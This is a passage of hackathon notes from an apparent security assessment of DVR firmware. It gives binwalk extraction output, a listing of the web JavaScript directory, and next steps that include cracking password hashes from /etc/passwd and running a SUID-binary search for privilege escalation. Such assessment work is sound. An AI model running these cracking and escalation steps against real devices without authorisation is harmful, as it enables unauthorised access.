21241060      0x1441CE4       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/Iva_AtmPaste.c
21241429      0x1441E55       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/ivs/Iva_StandUpDete.c
21244806      0x1442B86       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/videoprocess/Iva_FishPr
21245809      0x1442F71       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/videoprocess/Iva_TidPro
21246106      0x144309A       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva/build/../src/comm/Iva_cache.c
21246508      0x144322C       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva_core/build/../src/algCom.c
21247929      0x14437B9       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva_core/build/../src/algCmd.c
21249944      0x1443F98       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva_core/build/../src/algData.c
21250198      0x1444096       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva_core/build/../src/algMem.c
21250844      0x144431C       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva_core/build/../src/algfd.c
21252188      0x144485C       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva_core/build/../src/algVQA.c
21253309      0x1444CBD       Unix path: /home/jenkins/jk_slave/workspace/DVR_DH3.1032_DVR3.210.0001/tmp_build_dir/libiva/src/libiva_core/build/../src/algIvs_priv.c
21664668      0x14A939C       AES Inverse S-Box
21670561      0x14AAAA1       Unix path: /usr/local/ssl"
21747848      0x14BD888       SHA256 hash constants, little endian
21754884      0x14BF404       Unix path: /usr/local/ssl/private
21762276      0x14C10E4       Copyright string: "Copyright (C) 2004-2005 Kepler Project"
21769672      0x14C2DC8       Base64 standard index table
21770865      0x14C3271       Copyright string: "Copyright (C) 2003-2005 Kepler Project"
21828994      0x14D1582       Copyright string: "Copyright (c) 1998-2006 Glenn Randers-Pehrson"
21829043      0x14D15B3       Copyright string: "Copyright (c) 1996-1997 Andreas Dilger"
21829085      0x14D15DD       Copyright string: "Copyright (c) 1995-1996 Guy Eric Schalnat, Group 42, Inc."
21851921      0x14D6F11       SQLite 3.x database,, user version 1920540779
21870355      0x14DB713       SQLite 3.x database,, user version 100663296
21899976      0x14E2AC8       CRC32 polynomial table, little endian
21904072      0x14E3AC8       CRC32 polynomial table, big endian
21908303      0x14E4B4F       Copyright string: "Copyright 1995-2005 Jean-loup Gailly "
21911491      0x14E57C3       Copyright string: "Copyright 1995-2005 Mark Adler "
21932436      0x14EA994       Base64 standard index table
21943060      0x14ED314       Unix path: /var/run/egd-pool
21960800      0x14F1860       Unix path: /sys/class/net
21961991      0x14F1D07       Unix path: /sys/kernel/debug/usb/usbmon/%ds
21981876      0x14F6AB4       Unix path: /usr/lib/debug
22008510      0x14FD2BE       Copyright string: "Copyright (c)1992-2012, ZheJiang Dahua Technology Stock CO.LTD."
22008729      0x14FD399       Unix path: /usr/sbin/3gpp
22008828      0x14FD3FC       Unix path: /etc/ppp/pppoe-enable
22008910      0x14FD44E       Unix path: /etc/ppp/options
22009240      0x14FD598       Unix path: /etc/ppp/pppoe-redial_time
22009437      0x14FD65D       Unix path: /var/tmp/dial-ip
22009827      0x14FD7E3       Unix path: /usr/data/ssl/pubkey.pem
22086655      0x15103FF       Unix path: /sys/bus/usb-serial/devices
22086725      0x1510445       Unix path: /sys/bus/usb/devices/
22087205      0x1510625       Unix path: /sys/bus/usb/devices/%u-%u.%u
22090836      0x1511454       Unix path: /dev/rd/c0d0  or: fdisk /dev/ida/c0d0  (for RAID devices)
22099396      0x15135C4       Unix path: /usr/ucb/mdec
22110020      0x1515F44       Unix path: /home/pub/platform_h5_build/mpp/component/jpegd/jpeg/src/src_hard/jpeg_hdec_mem.c
22113916      0x1516E7C       Copyright string: "Copyright (C) 1998, Thomas G. Lane"
23871670      0x16C40B6       MySQL MISAM index file Version 3
24027578      0x16EA1BA       MySQL MISAM compressed data file Version 1
```

# Algorithms
# 
    jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/web/jsCore$ ls
    aes.js  common.js  rpcCore.js  rsa.js


# Important
   write impact in slides, and include direct access to web directory as a vulnerability
## **Next Steps**
Important - todo:
#
    Automation of assessment
    Network wide capability
    Linux hardening standard operating procedures
    look up the sops and get "inspiration" (CTRL C + CTRL V) for slides
1. Attempt password cracking for hashes found in `/etc/passwd` and `/etc/passwd-`.
2. Analyze startup scripts in `/etc/init.d/` for potential vulnerabilities.
3. Search for SUID/SGID binaries that could allow privilege escalation:
# 
    find / -perm /4000 2>/dev/null

    
---

## **Conclusion**
The analysis so far has successfully extracted the firmware's filesystem and identified areas of interest, such as weak password storage mechanisms and potential hardware details (HiSilicon Hi3520D). Further exploration will focus on uncovering vulnerabilities within the system.


